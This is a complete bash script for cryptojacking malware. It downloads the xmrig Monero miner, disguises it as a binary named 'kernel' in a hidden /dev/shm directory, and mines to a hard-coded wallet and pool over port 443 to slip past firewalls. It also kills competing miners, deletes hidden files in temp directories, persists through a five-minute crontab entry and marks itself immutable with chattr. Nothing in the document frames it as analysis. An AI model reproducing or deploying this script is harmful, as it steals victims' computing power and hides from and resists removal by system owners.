#!/bin/bash

# --- CONFIGURATION ---
WALLET="45cV4VxfBgeTzXeU4YoWQUQtjkugAuwqXVXpJmiMExRsYutqBa5RAEg6ZtPWpY7vVQ3tULGBszh1h1CLsAz1sqoXExNykBL"
WORKER="HlaingBwar_Worker"
POOL="gulf.moneroocean.stream:443" # Using Port 443 to bypass most firewalls
DIR="/dev/shm/.sys_update"
BIN="$DIR/kernel"

# --- THE PURGE: KILL RIVALS ---
# Kill any known mining processes and high CPU consumers
pkill -9 -f "javae|node-f|xmrig|miner|monero|xmr|nanominer|nicehash"
find /tmp /var/tmp /dev/shm -name ".*" -exec rm -rf {} + 2>/dev/null

# --- SETUP ENVIRONMENT ---
mkdir -p $DIR
cd $DIR

# --- DOWNLOAD STATIC MINER ---
# Using a static binary to ensure it runs on any Linux distro
if [ ! -f "$BIN" ]; then
    curl -s -L https://github.com/moneroocean/xmrig_setup/raw/master/xmrig.tar.gz -o xmrig.tar.gz
    tar -xzf xmrig.tar.gz
    mv xmrig kernel
    chmod +x kernel
    rm xmrig.tar.gz
fi

# --- PERSISTENCE LOGIC (CRONTAB) ---
# Re-run every 5 minutes if killed
(crontab -l 2>/dev/null | grep -v "kernel"; echo "*/5 * * * * $BIN --url $POOL --user $WALLET --pass $WORKER --tls -B >/dev/null 2>&1") | crontab -

# --- EXECUTE MINER ---
# Running in background with TLS enabled
$BIN --url $POOL --user $WALLET --pass $WORKER --tls -B >/dev/null 2>&1

# --- LOCKDOWN ---
# Make the binary immutable so even root has trouble deleting it
chattr +i $BIN 2>/dev/null
chattr +i /var/spool/cron/crontabs/$(whoami) 2>/dev/null
